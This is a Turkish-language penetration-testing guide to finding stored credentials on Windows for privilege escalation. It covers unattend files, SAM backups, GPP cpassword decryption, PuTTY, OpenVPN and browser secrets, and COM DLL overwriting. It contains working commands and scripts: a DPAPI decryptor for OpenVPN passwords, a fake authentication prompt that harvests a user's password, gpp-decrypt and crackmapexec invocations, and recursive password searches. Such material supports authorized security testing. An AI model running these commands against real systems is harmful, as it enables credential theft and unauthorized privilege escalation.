Elle hazırlanmış bir parola döndürücü, şifrelenmiş bir yerel yönetici parolasını yerel bir hizmette tutarken veri deposu kimlik bilgilerini okunabilir bir `.env` dosyasında veya güncelleyici ikilisinin yanında saklayabilir. Güncelleyicinin zamanlanmış görevini, hesabını, yapılandırma ACL'lerini, dinleyicisini ve veri deposu izinlerini birlikte inceleyin. Yalnızca loopback üzerinde çalışan bir veri deposuna, geçerli kimlik bilgilerine sahip yerel bir kullanıcı yine de erişebilir; ancak kimlik doğrulaması, ilgili kayıtları okuma izninin olduğunu tek başına kanıtlamaz. Şifreleme tohumu veya anahtar malzemesi şifreli verinin yanında erişilebiliyorsa, şifrelemeye güvenmeden önce anahtar türetme yöntemini dikkatle inceleyin. Açığa çıkmış bir tohumdan Go'nun [`math/rand`](https://pkg.go.dev/math/rand) paketiyle deterministik olarak AES anahtarı türeten bir şema, bu parolayı korumaya uygun değildir; Go, bu paketin güvenlik açısından hassas rastgelelik gerektiren işler için uygun olmadığını belirtiyor. Kurtarılan bir parolayı yükseltme yolu olarak değerlendirmeden önce güncel olduğunu ve yerel Administrators grubu hesabına ait olduğunu doğrulayın. Zamanlanmış görev, `.env` yolu veya şifrelenmiş veri bloğu bu koşulların hiçbirini tek başına kanıtlamaz. Parolaları ve anahtar malzemesini rutin sayım çıktılarında göstermeyin.

Yönetilen yerel yönetici parolaları için [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kullanın. Bunun dizin tabanlı veya Entra destekli depolaması ve erişim denetimleri, özel yerel veri deposundan farklıdır; [Elasticsearch rolleri](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) de kimliği doğrulanmış bir veri deposu kullanıcısının belirli bir dizini okuyup okuyamayacağını belirler.

### Java sunucusu eklenti arşivleri ve kimlik bilgisi yeniden kullanımı

Bazı Java sunucusu eklentileri, sunucunun `plugins` dizininde JAR arşivleri olarak dağıtılır. Okunabilir bir özel eklenti, gömülü hizmet kimlik bilgisi içeren yapılandırma veya bayt kodu barındırabilir. Arşivi yalnızca yetkiniz varsa inceleyin ve kurtarılan sırları rutin sayım çıktılarında göstermeyin. Eklenti yolu tek başına bir sırrın var olduğunu kanıtlamaz; kurtarılan bir hizmet parolası da ancak daha ayrıcalıklı bir hesap için geçerliyse daha yüksek ayrıcalıklara götürür. İlgili dosya ACL'lerini denetleyin ve yeniden kullanılan kimlik bilgilerini birbirinden farklı sırlarla değiştirin. Dizin düzeni için [PaperMC'nin eklenti yükleme kılavuzuna](https://docs.papermc.io/paper/adding-plugins/), arşiv içeriği için [Oracle'ın JAR belgelerine](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) bakın.

### Openfire gömülü veritabanı kimlik bilgileri

Gömülü veritabanı kullanan bir Openfire kurulumu, `openfire.script` dosyasını `Openfire\embedded-db` altında tutabilir. Mevcut hesap bu dosyayı okuyabiliyorsa, `OFUSER` kayıtlarını ve `passwordKey` özelliğini birlikte inceleyin. Openfire'ın [kullanıcı sağlayıcısı belgeleri](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html), parolaların düz metin olarak saklanabileceğini veya bu özellikte tutulan bir anahtarla şifrelenebileceğini belirtiyor. Kurtarılan bir parola, yalnızca daha ayrıcalıklı bir kimlik için hâlâ geçerliyse yükseltme açısından önemlidir; dosya adı tek başına ne okuma erişimini ne de kimlik bilgisinin yeniden kullanıldığını kanıtlar. Bu yol bir envanter ipucudur; veritabanı içeriğini ve kimlik bilgilerini rutin sayım çıktılarında göstermeyin.

Ayrı `Openfire\conf\openfire.xml` dosyası, harici bir veritabanı kullanılsa bile yönetici konsolunun yapılandırılmış portlarını ve bağlandığı arabirimi gösterebilir. Openfire, yönetici konsolunu genellikle loopback adresine bağlar; dinleyici çalışıyorsa yerel bir hesap yine de bu adrese erişebilir. Gerçek dinleyiciyi, yetkili yönetici rolünü, eklenti yükleme ilkesini ve Openfire hizmet kimliğini birlikte denetleyin. Eklenti yükleyebilen bir yönetici, eklenti kodunun hizmet bağlamında çalışmasına neden olabilir; hizmet LocalSystem olarak çalışıyorsa bu bağlam yüksek ayrıcalıklara sahip olabilir. Eşleşen bir hesap parolası veya okunabilir bir yapılandırma yolu tek başına yönetici konsoluna erişimi ya da kod yürütmeyi kanıtlamaz. Satıcının [kurulum ve eklenti yönetimi kılavuzuna](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) ve [eklenti yükleme API özelliğine](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) bakın.

### Adli bilişim yönetim sunucusu yapılandırması

Genellikle `server.config.yaml` olarak adlandırılan Velociraptor sunucusu yapılandırmaları, dahili CA'nın `CA.private_key` değerini içerebilir. Daha düşük ayrıcalıklı bir kullanıcı bu anahtarı okuyabiliyorsa, bir API istemci sertifikası oluşturabilir. Bunun daha yüksek ayrıcalıklara yol açıp açmayacağı sunucunun kullanıcı rollerine, API erişilebilirliğine ve sunucunun veya hedef aracının çalıştığı kimliğe bağlıdır. İstemci yapılandırması farklı malzeme içerir; bir tane bulmak, sunucu CA'sına erişim olduğunu göstermez. Bazı dağıtımlarda CA özel anahtarı çevrimdışı tutulur; bu nedenle okunabilir sunucu yapılandırmasında imzalama anahtarı bulunmayabilir.

Bir Windows sunucusunda, kurulum dizinindeki **sunucu** yapılandırmasının ve korumalı yedek kopyaların ACL'lerini inceleyin. Olası konumlardan biri `%ProgramFiles%\VelociraptorServer\server.config.yaml` şeklindedir; farklıysa hizmetin yapılandırılmış yolunu kullanın. Mevcut kimliğin dosyayı okuyabildiğini ve `CA.private_key` değerinin gerçekten mevcut olduğunu doğrulayın. Özel anahtarı günlüklerde veya sayım çıktılarında yazdırmaktan kaçının. Satıcının `config api_client` iş akışı, istemci sertifikası vermek için CA anahtarını kullanır; ancak etkili bir sunucu tarafı rolü de gerekir ve rol oluşturmak veya değiştirmek, veri deposuna yazma erişimi ya da yeniden başlatma gerektirebilir. Bu yazma işlemleri mümkün olmadığında bile mevcut ayrıcalıklı bir sunucu kimliği bir yol sağlayabilir. Yürütme haklarına sahip API sorguları, ilgili sunucu veya aracı bağlamında çalışır ve bu bağlam yüksek ayrıcalıklara sahip olabilir.

Sunucu yapılandırmasını ve yedeklerini kısıtlayıcı ACL'lerle koruyun, mümkün olduğunda CA imzalama anahtarını çevrimdışı tutun ve API rollerini ve dinleyici erişimini sınırlandırın. [Velociraptor API belgelerine](https://docs.velociraptor.app/docs/server_automation/server_api/) ve [güvenlik yapılandırması kılavuzuna](https://docs.velociraptor.app/docs/deployment/security/) bakın.

### Putty Kimlik Bilgileri

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ayrı bir session manager'dır. Yerel şifrelenmiş deposu `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` konumunda olabilir; dışa aktarılan bir session yedeği `sessions-backup.dat` olarak adlandırılmış ve başka bir konumda saklanmış olabilir. [SolarWinds'in dışa aktarma kılavuzuna](https://thwack.solarwinds.com/discussion/comment/115591) göre dışa aktarılan veriler parola ile şifrelenir ve session'lar, key'ler, script'ler, tag'ler ve ilişkiler içerebilir; [destek forumu](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) yerel depoyu belirtir. Önce dosya izinlerini ve yolları kontrol edin. Bu dosyalardan herhangi birini bulmak parolasını ortaya çıkarmaz veya kayıtlı herhangi bir credential'ın hâlâ geçerli olduğunu ya da daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz.

### Putty SSH Host Anahtarları

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Kayıt defterindeki SSH anahtarları

SSH özel anahtarları `HKCU\Software\OpenSSH\Agent\Keys` kayıt defteri anahtarında saklanabilir; bu nedenle burada ilginizi çekebilecek bir şey olup olmadığını kontrol etmelisiniz:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Bu yolun içinde herhangi bir kayıt bulursanız, bu muhtemelen kayıtlı bir SSH anahtarıdır. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` servisi çalışmıyorsa ve açılışta otomatik olarak başlamasını istiyorsanız, şunu çalıştırın:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Görünüşe göre bu teknik artık geçerli değil. Birkaç SSH key oluşturup bunları `ssh-add` ile eklemeyi ve SSH üzerinden bir makineye giriş yapmayı denedim. HKCU\Software\OpenSSH\Agent\Keys kayıt defteri anahtarı mevcut değil ve procmon, asimetrik key kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Katılımsız dosyalar

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM yedekleri

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Okunabilir Windows Imaging (`.wim`) yedek dosyaları çevrimdışı `SAM`, `SECURITY` ve `SYSTEM` hive'larını da içerebilir. Yerel olarak erişilebilen yedek veya imaj dizinlerine öncelik verin ve herhangi bir şeyi çıkarmadan önce imajın **üye adlarını** inceleyin; yalnızca `.wim` dosya adı hive'ların açığa çıktığını kanıtlamaz ve rutin `install.wim`, `boot.wim` ve kurtarma imajları sık karşılaşılan yanıltıcı sonuçlardır. SMB paylaşımı ayrı bir erişim yoludur ve yalnızca bu paylaşım kapsam dahilindeyse kontrol edilmelidir. Microsoft'un [Windows imajı yönergelerine](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) ve [registry hive dosyası başvuru sayfasına](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) bakın.

### Bulut Kimlik Bilgileri

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** adlı bir dosya arayın.

### Önbelleğe Alınmış GPP Parolası

Daha önce, Grup İlkesi Tercihleri (GPP) aracılığıyla bir grup makineye özel yerel yönetici hesaplarının dağıtılmasına olanak tanıyan bir özellik mevcuttu. Ancak bu yöntemin ciddi güvenlik açıkları vardı. İlk olarak, SYSVOL'de XML dosyaları olarak depolanan Grup İlkesi Nesnelerine (GPO'lar) herhangi bir etki alanı kullanıcısı erişebiliyordu. İkinci olarak, bu GPP'lerde AES256 ile şifrelenmiş parolalar, herkesçe bilinen varsayılan bir anahtar kullanılarak herhangi bir kimliği doğrulanmış kullanıcı tarafından çözülebiliyordu. Bu durum, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine yol açabileceğinden ciddi bir risk oluşturuyordu.

Bu riski azaltmak için, boş olmayan bir "cpassword" alanı içeren yerel olarak önbelleğe alınmış GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulduğunda işlev parolanın şifresini çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, GPP ve dosyanın konumu hakkında ayrıntılar içererek bu güvenlik açığının belirlenmesine ve giderilmesine yardımcı olur.

Bu dosyaları `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesi)_ konumunda arayın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'ın şifresini çözmek için:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Parolaları elde etmek için crackmapexec kullanımı:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Kimlik bilgileri içeren web.config örneği:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot içindeki yedek arşivleri

Doğrudan sunulan bir webroot içine yerleştirilmiş eski bir ZIP yedeği, önceki yapılandırma dosyalarını ve yeniden kullanılabilir kimlik bilgilerini açığa çıkarabilir. Bu durumu bir veri ifşası olarak değerlendirmeden önce sitenin yapılandırılmış fiziksel yolunu ve arşive HTTP üzerinden gerçekten erişilip erişilemediğini kontrol edin. Varsayılan `C:\inetpub\wwwroot` yolu yalnızca olası bir konumdur. Hızlı bir yerel envanter, arşivleri açmadan adları ve boyutları listeleyebilir:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Bir arşiv adı, içinde gizli bilgi bulunduğunu veya kurtarılan bir kimlik bilgisinin daha yüksek ayrıcalık sağladığını kanıtlamaz.

### OpenVPN kimlik bilgileri

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Günlükler

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Kimlik bilgilerini isteyin

Bunları bilebileceğini düşünüyorsanız, kullanıcıdan kendi kimlik bilgilerini, hatta başka bir kullanıcının kimlik bilgilerini girmesini her zaman **isteyebilirsiniz** (istemciye doğrudan **kimlik bilgilerini** sormanın gerçekten **riskli** olduğunu unutmayın):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Kimlik bilgileri içerebilecek olası dosya adları**

Geçmişte **parolaları** **açık metin** veya **Base64** biçiminde içermiş bilinen dosyalar

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 veritabanıları genellikle `.psafe3` uzantısını kullanır. Eşleşen bir dosya adını şifrelenmiş kasa adayı olarak değerlendirin; dosyanın varlığı, dosyayı okuyabileceğinizi, kilidini açabileceğinizi veya içinde saklanan kimlik bilgilerini kullanabileceğinizi kanıtlamaz. Bu tür dosyaların nerede saklandığını incelerken erişilebilir kullanıcı profillerini ve yapılandırılmış dosya paylaşım köklerini kontrol edin.

Okunabilir bir KeePass `.kdbx` dosyası da yalnızca şifrelenmiş kasa için bir ipucudur. Kilidini açmak için gerçek ana parola ve yapılandırılmış tüm anahtar dosyası veya hesap faktörleri gerekir. Yetkili bir incelemede bir kayıtta LM:NT hash çifti bulunursa, [pass-the-hash](../ntlm/README.md#pass-the-hash) yöntemini değerlendirmeden önce adı geçen hesabı ve NT hash’inin güncel olup olmadığını ve hedefin NTLM hizmeti tarafından kabul edilip edilmediğini doğrulayın. Bir kasa kaydı tek başına Administrator veya SYSTEM hakları vermez; uzaktan hizmet erişimi, hesap hakları ve ayrı bir hizmet yürütme adımı da mevcut olmalıdır. Envanterde veritabanı veya saklanan kimlik bilgileri yazdırılmamalı; yalnızca kasa yolu ve okunabilirlik durumu raporlanmalıdır.

Önerilen tüm dosyaları arayın:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Recycle Bin'deki Kimlik Bilgileri

Erişebildiğiniz Recycle Bin girdilerinde silinmiş yedekleri ve yapılandırma arşivlerini, ayrıca adında açıkça kimlik bilgilerinden söz edilen dosyaları kontrol edin. Kullanışlı bir `.7z`, `.zip` veya `.rar` yedeği aylar öncesine ait olabilir ve sıradan bir dosya adına sahip olabilir. Windows, özgün yolu ve silinme zamanını `$I` kaydında, silinen dosyayı ise eşleşen `$R` girdisinde saklar; bir arşivi açmadan önce meta verileri ve geçerli kimliğin okuma erişimini inceleyin. Görünürlük birime, kullanıcı SID'sine ve dosya izinlerine bağlıdır; bu nedenle boş bir liste, kurtarılabilir yedek olmadığını kanıtlamaz. Arşiv adını, geçerli bir sır içerdiğinin kanıtı olarak değil, incelenmeye değer bir aday olarak değerlendirin.

Erişilebilir, silinmiş bir `.pfx` dosyası **code-signing** için de bir ipucu olabilir. Erişilebilir bir özel anahtar içeriyorsa bu anahtar, değiştirilmiş bir PowerShell script'ini imzalamak için kullanılabilir; [PowerShell, özel anahtara sahip bir code-signing sertifikası gerektirir](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature) ve [AppLocker publisher kuralları imzalayanın kimliğini ve kuralın kapsamını değerlendirir](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Hesaplar arası yürütme için geçerli kimliğin tam olarak ilgili script'i değiştirebilmesi, etkin bir kuralın script ve hedef hesap için ortaya çıkan imzayı kabul etmesi ve daha yüksek ayrıcalıklara sahip bir zamanlanmış görevin veya başka bir bileşenin script'i gerçekten çalıştırması gerekir. Bir `.pfx` dosya adı, sertifika konusu veya yazılabilir bir script tek başına bu zincirin varlığını kanıtlamaz. Özel anahtar materyalini açmadan veya görevi tetiklemeden önce meta verileri, ACL'leri, politikayı ve zamanlanmış komutu inceleyin.

Kimlik bilgilerine dair ipuçları bulmak için erişilebilir mesajlaşma istemcisi profili veritabanlarını, notları ve alınan dosyaları da inceleyin. BitLocker kurtarma anahtarı dışa aktarımı HTML veya TXT olarak, bazen de adı belirli bir yedek arşivinin içinde saklanabilir. Böyle bir materyal, eski yedeklerin bulunduğu ayrı bir şifreli veri birimine erişim sağlayabilir; birimi ve arşivi yalnızca erişim yetkiniz varsa inceleyin. Bir yedek `NTDS.dit` içeriyorsa çevrimdışı etki alanı kimlik bilgilerinin kurtarılması için [yedekleme ve ayrıcalıklı gruplar iş akışında](../active-directory-methodology/privileged-groups-and-token-privileges.md) açıklandığı gibi eşleşen `SYSTEM` hive'ı da gerekir. Dosya adları ve kilitli bir birim, kullanılabilir bir kurtarma anahtarının veya etki alanı yedeğinin bulunduğunu tek başına kanıtlamaz.

Birkaç programın kaydettiği **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry içinde

**Kimlik bilgileri içerebilecek diğer registry anahtarları**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Registry'den OpenSSH anahtarlarını çıkarın.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome, Edge veya Firefox** parolalarının depolandığı veritabanlarını kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer işaretlerini ve favorilerini de kontrol edin; parolalar buralarda depolanmış olabilir.

Geçerli kullanıcının standart Edge **Default** profili için `Login Data`, `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` konumundadır; `Local State` ise üst dizindeki `User Data` dizinindedir. [Microsoft varsayılan profil konumunu belgeliyor](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); başka bir profil veya `UserDataDir` ilkesi konumu değiştirebilir. Dosyaların varlığı yalnızca kimlik bilgisi deposuna dair bir ipucudur: okunabilir dosyaları, ilgili kullanıcının DPAPI bağlamını veya yetkili başka anahtar malzemelerini ve kayıtlı bir oturum açma bilgisinin daha ayrıcalıklı bir hesaba ait olup olmadığını doğrulayın. Yalnızca yolları listelemek için veritabanını açmanız veya şifresi çözülmüş parolaları yazdırmanız gerekmez.

Firefox için [Mozilla,](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) bir profildeki `key4.db` ve `logins.json` dosyalarının eşleşen anahtar ve şifrelenmiş oturum açma dosyaları olduğunu belgeliyor. Bu dosyaların varlığı yalnızca bir ipucudur: kimlik bilgilerinin kullanılabilir olduğu sonucuna varmadan önce her iki dosyanın da okunabilir olup olmadığını, kayıtlı girdilerin bulunup bulunmadığını ve anahtarın bir Primary Password ile korunup korunmadığını kontrol edin. Kurtarılan bir kimlik bilgisi bir domain hesabına aitse, bu hesabın etkin grup denetimi haklarını ve grubun [LAPS parolasını okuma veya şifresini çözme haklarını](../active-directory-methodology/laps.md) ayrı ayrı inceleyin; tarayıcı kalıntıları tek başına yönetici erişim yolu olduğunu kanıtlamaz.

Tarayıcılardan parola çıkarmak için araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, farklı dillerdeki yazılım bileşenleri arasında **iletişim kurulmasını** sağlayan, Windows işletim sistemine yerleşik bir teknolojidir. Her COM bileşeni bir **class ID (CLSID) ile tanımlanır** ve her bileşen, interface ID'leri (IID'ler) ile tanımlanan bir veya daha fazla arayüz aracılığıyla işlevsellik sunar.

COM sınıfları ve arayüzleri sırasıyla kayıt defterinde **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlanır. Bu kayıt defteri, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** birleştirilerek oluşturulur.

Bu kayıt defterindeki CLSID'lerin altında, bir **DLL'yi** gösteren **varsayılan değeri** ve **ThreadingModel** adlı bir değeri içeren **InProcServer32** alt kayıt defterini bulabilirsiniz. **ThreadingModel** değeri **Apartment** (Tek İş Parçacıklı), **Free** (Çok İş Parçacıklı), **Both** (Tek veya Çok İş Parçacıklı) ya da **Neutral** (İş Parçacığından Bağımsız) olabilir.

![Tarayıcı Geçmişi - COM DLL Overwriting: Bu kayıt defterindeki CLSID'lerin altında, bir DLL'yi gösteren varsayılan değeri ve bir değer... içeren InProcServer32 alt kayıt defterini bulabilirsiniz.](<../../images/image (729).png>)

Temel olarak, çalıştırılacak DLL'lerden herhangi birinin **üzerine yazabilirseniz**, farklı bir kullanıcı tarafından çalıştırılması durumunda **ayrıcalıkları yükseltebilirsiniz**.

Saldırganların kalıcılık mekanizması olarak COM Hijacking'i nasıl kullandığını öğrenmek için şuraya bakın:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve kayıt defterinde genel parola araması**

**Dosya içeriklerinde arama yapın**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Belirli bir dosya adına sahip dosyayı arama**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Kayıt defterinde anahtar adlarını ve parolaları arayın**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Parolaları arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** plugin'idir. Kurbanın içinde kimlik bilgilerini arayan her metasploit POST modülünü **otomatik olarak çalıştırması** için bu plugin'i oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen parolaları içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için kullanılan bir başka harika araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) bu verileri açık metin olarak kaydeden çeşitli araçların **oturumlarını**, **kullanıcı adlarını** ve **parolalarını** arar (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
